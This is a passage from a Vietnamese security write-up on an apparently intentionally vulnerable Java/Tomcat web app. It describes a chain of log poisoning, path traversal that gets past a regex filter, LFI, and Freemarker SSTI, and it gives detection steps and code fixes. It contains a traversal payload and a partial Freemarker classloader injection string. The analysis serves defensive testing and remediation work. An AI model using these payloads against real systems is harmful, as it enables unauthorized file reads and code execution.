+"GET /api/v1/profile/basic-info HTTP/1.1" 200 ... "<#assign classloader=profileTheme.class.protectionDomain.classLoader>..."
+```
+
+Điểm quan trọng: log poisoning là source content, còn `profileTheme` là source selector. Hai source này gặp nhau tại `Files.readString(...)`.
+
+***
+
+## 4. Source -> Sink
+
+### 4.1. Detect riêng LFI bằng marker trong log
+
+Luồng detect LFI không cần command execution:
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant AnyAPI as Any logged HTTP endpoint
+    participant Log as logs/access.log
+    participant UserAPI as PUT /api/v1/user
+    participant Profile as GET /api/v1/profile/basic-info
+    participant Loader as CustomThemeLoader
+    participant Browser as Response HTML
+
+    Attacker->>AnyAPI: Request with User-Agent marker KTV-LFI-MARKER
+    AnyAPI->>Log: Tomcat writes combined access log
+    Attacker->>UserAPI: Persist profileTheme = ..//..//logs/access.log
+    Attacker->>Profile: Trigger profile render
+    Profile->>Loader: loadProfileTheme(stored profileTheme, model)
+    Loader->>Log: Files.readString(log path)
+    Loader-->>Profile: Log content rendered as template text
+    Profile-->>Browser: Response contains KTV-LFI-MARKER
+```
+
+Detect checklist:
+
+| Step | Expected evidence |
+|---|---|
+| Poison log | `logs/access.log` có marker trong User-Agent/Referer |
+| Persist selector | `USER.PROFILE_THEME` chứa traversal path `..//..//logs/access.log` |
+| Trigger profile | `GET /api/v1/profile/basic-info` trả HTML có marker |
+| Kết luận | LFI Log Poisoning đã xảy ra dù chưa dùng SSTI |
+
+### 4.2. Source selector path traversal
+
+Với `customThemeRoot = data/custom_themes`, path đến log mặc định là:
+
+```text
+..//..//logs/access.log
+```
+
+Giải thích:
+
+| Segment | Ý nghĩa |
+|---|---|
+| `data/custom_themes` | Root custom theme |
+| `..//` thứ nhất | Thoát về `data` |
+| `..//` thứ hai | Thoát về project root |
+| `logs/access.log` | File log mặc định của Tomcat |
+
+Flow:
+
+```mermaid
+flowchart TD
+    A["profileTheme = '..//..//logs/access.log'"]
+    B["rejectRelativeParentPath(...)"]
+    C{"Regex sees '../' with single slash?"}
+    D["Bypass because payload uses '..//'"]
+    E["customThemeRoot.resolve(themeName)"]
+    F["Filesystem resolves parent directories"]
+    G["logs/access.log"]
+    H["Files.readString(...)"]
+
+    A --> B --> C
+    C -->|No| D --> E --> F --> G --> H
+```
+
+### 4.3. Kết hợp LFI Log Poisoning với SSTI
+
+Sau khi LFI đọc được log, cùng content đó được đưa tiếp vào Freemarker:
+
+```java
+String templateSource = Files.readString(resolvedThemePath, StandardCharsets.UTF_8);
+return renderTemplateSource(templateSource, model);
+```
+
+Vì vậy nếu log marker là Freemarker expression, chain sẽ nâng cấp thành SSTI:
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant AnyAPI as Logged request
+    participant Log as logs/access.log
+    participant Profile as GET /api/v1/profile/basic-info
+    participant FTL as Freemarker
+    participant Obj as profileTheme object
+    participant QR as QRCodeHelper
+
+    Attacker->>AnyAPI: User-Agent contains Freemarker payload
+    AnyAPI->>Log: Payload persisted into access.log
+    Attacker->>Profile: Trigger with stored profileTheme traversal
+    Profile->>Log: Files.readString(access.log)
+    Profile->>FTL: new Template(...log content...)
+    FTL->>Obj: Optional object-chain via profileTheme.class...
+    FTL->>QR: Optional dev-supplied QRCodeHelper?new()
+```
+
+Kết luận kết hợp:
+
+| Phase | Vulnerability detect riêng | Evidence |
+|---|---|---|
+| Phase 1 | Log Poisoning | Attacker marker nằm trong `logs/access.log` |
+| Phase 2 | LFI | Response profile render lại marker từ log |
+| Phase 3 | SSTI upgrade | Freemarker expression trong log được evaluate |
+| Phase 4 | Hidden command sink | `QRCodeHelper?new()` hoặc object-chain tạo side effect |
+
+***
+
+## 5. Fix guidance đặt cạnh sink
+
+### 5.1. Fix path traversal/LFI
+
+Normalize path và bắt buộc nằm trong custom theme root:
+
+```java
+Path root = customThemeRoot.toRealPath();
+Path candidate = root.resolve(themeName).normalize();
+if (!candidate.startsWith(root) || !candidate.getFileName().toString().endsWith(".ftl")) {
+    throw new IllegalArgumentException("Invalid theme path");
+}
+```
+
+Không dùng regex tự chế để quyết định path an toàn. Nếu vẫn cần regex, chỉ dùng như lớp phụ:
+
+```java
+private static final Pattern SAFE_THEME_NAME =
+        Pattern.compile("^[A-Za-z0-9_-]+\\.ftl$");
+```
+
+### 5.2. Fix log poisoning
+
+Không để access log nằm trong vùng application có thể đọc qua theme loader:
+
+```properties
+server.tomcat.accesslog.directory=/var/log/ktv-airline
+server.tomcat.accesslog.pattern=%h %l %u %t "%m %U %H" %s %b
+```
+
+Nguyên tắc:
+
+| Fix | Lý do |
+|---|---|
+| Log ở ngoài project/theme root | LFI trong app khó đọc được log |
+| Không log User-Agent/Referer nếu không cần | Giảm nguồn attacker-controlled content |
+| Không render log bằng template engine | Chặn log poisoning nâng cấp thành SSTI |
+| Rotate/permission log chặt | Giảm cửa sổ khai thác và rò rỉ |
+
+### 5.3. Fix điểm giao với SSTI
+
+Ngay cả khi đọc nhầm file, không được compile nội dung file bất kỳ thành Freemarker:
+
+```java
+String templateSource = Files.readString(resolvedThemePath, StandardCharsets.UTF_8);
+return "<pre>" + escapeHtml(templateSource) + "</pre>";
+```
+
+Hoặc tốt nhất: chỉ render classpath templates trong allowlist, không render filesystem content.
+
+***
+
+## 6. Tổng kết LFI Log Poisoning
+
+LFI Log Poisoning có hai source độc lập:
+
+1. **Content source:** HTTP request data được Tomcat ghi vào `logs/access.log`.
+2. **Selector source:** `PUT /api/v1/user` ghi `profileTheme`, rồi profile render dùng selector này để đọc file.
+
+Detect riêng LFI:
+
+```text
+Poison marker vào access log
+-> persist profileTheme = ..//..//logs/access.log
+-> GET /api/v1/profile/basic-info
+-> response chứa marker
+```
+
+Detect kết hợp SSTI:
+
+```text
+Poison Freemarker payload vào access log
+-> LFI đọc access.log
+-> new Template(...log content...)
+-> object-chain hoặc dev-supplied helper được evaluate
+```
